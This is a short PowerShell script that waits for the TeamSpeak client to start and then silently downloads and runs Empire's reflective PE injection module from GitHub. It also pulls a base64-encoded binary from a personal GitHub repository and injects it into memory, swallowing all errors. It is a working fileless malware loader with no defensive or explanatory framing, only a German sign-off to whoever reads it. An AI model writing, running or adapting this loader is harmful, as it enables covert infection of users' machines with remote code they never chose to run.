$ErrorActionPreference = 'SilentlyContinue'

while (!(Get-Process ts3client_win64)) { 
    Start-Sleep -Seconds 2 
}

Start-Sleep -Seconds 5 

try {
    [Net.ServicePointManager]::SecurityProtocol = 3072
    $wc = New-Object System.Net.WebClient
    
    $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
    Invoke-Expression $l

    $b = $wc.DownloadString("https://raw.githubusercontent.com/neight01/johannesschwein/refs/heads/main/johannesschwein.txt")
    $rb = [System.Convert]::FromBase64String($b)

    Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
} catch {
}

# Khiro wer das liest LG
exit
